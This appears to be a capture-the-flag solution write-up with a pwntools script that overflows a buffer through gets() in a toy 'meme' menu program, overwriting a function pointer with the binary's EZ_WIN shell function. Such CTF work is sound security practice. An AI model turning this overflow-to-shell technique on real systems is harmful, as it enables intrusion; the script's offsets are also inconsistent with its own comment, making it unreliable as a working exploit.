@@ -1,0 +1,84 @@
+To solve this challenge using pwntools, we need to exploit the vulnerability in the `edit_meme` function, which uses the insecure `gets` function. This allows us to overwrite the function pointer and redirect the execution to the `EZ_WIN` function, which spawns a shell.
+
+Here are the steps and the corresponding code to exploit this vulnerability:
+
+### Steps:
+1. **Initialize the connection**: Connect to the binary using pwntools.
+2. **Create a new meme**: Allocate a new meme with a size that will allow us to control the function pointer.
+3. **Edit the meme**: Use the `gets` function to overwrite the function pointer with the address of `EZ_WIN`.
+4. **Trigger the exploit**: Print the meme to trigger the overwritten function pointer and get a shell.
+
+### Code:
+```python
+from pwn import *
+
+# Set up the process or remote connection
+context.binary = './int'
+elf = context.binary
+
+# Local or remote
+if args.REMOTE:
+    p = remote('host', 1234)
+else:
+    p = process(elf.path)
+
+# Function to interact with the menu
+def menu(choice):
+    p.sendlineafter(b"Choice: ", str(choice).encode())
+
+# Function to create a new meme
+def new_meme(size, content):
+    menu(1)
+    p.sendlineafter(b"Enter meme size: ", str(size).encode())
+    p.sendlineafter(b"Enter meme content: ", content)
+
+# Function to edit a meme
+def edit_meme(index, content):
+    menu(2)
+    p.sendlineafter(b"Index: ", str(index).encode())
+    p.sendline(content)
+
+# Function to print a meme
+def print_meme(index):
+    menu(3)
+    p.sendlineafter(b"Index: ", str(index).encode())
+
+# Step 1: Create a new meme
+new_meme(0x10, b"A" * 0x10)  # Create a meme with size 0x10
+
+# Step 2: Edit the meme to overwrite the function pointer
+# The function pointer is at offset 0x8 from the start of the meme
+# We need to overwrite it with the address of EZ_WIN
+ez_win_addr = elf.symbols['EZ_WIN']
+log.info(f"EZ_WIN address: {hex(ez_win_addr)}")
+
+# Overwrite the function pointer
+edit_meme(0, b"A" * 0x10 + p64(ez_win_addr))
+
+# Step 3: Trigger the exploit by printing the meme
+print_meme(0)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation:
+1. **Connection Setup**:
+   - `context.binary = './int'` sets the binary context.
+   - `p = process(elf.path)` starts the local process, or `p = remote('host', 1234)` for a remote connection.
+
+2. **Menu Interaction**:
+   - `menu(choice)` sends the choice to the program.
+   - `new_meme(size, content)` creates a new meme with the specified size and content.
+   - `edit_meme(index, content)` edits the meme at the specified index with the given content.
+   - `print_meme(index)` prints the meme at the specified index.
+
+3. **Exploit Execution**:
+   - A new meme is created with a size of 0x10.
+   - The `edit_meme` function is used to overwrite the function pointer with the address of `EZ_WIN`.
+   - The `print_meme` function is called to trigger the overwritten function pointer, which calls `EZ_WIN` and spawns a shell.
+
+4. **Interactive Shell**:
+   - `p.interactive()` allows you to interact with the spawned shell.
+
+Make sure to replace `'host'` and `1234` with the actual host and port if you are connecting to a remote server. Run the script, and you should get a shell.
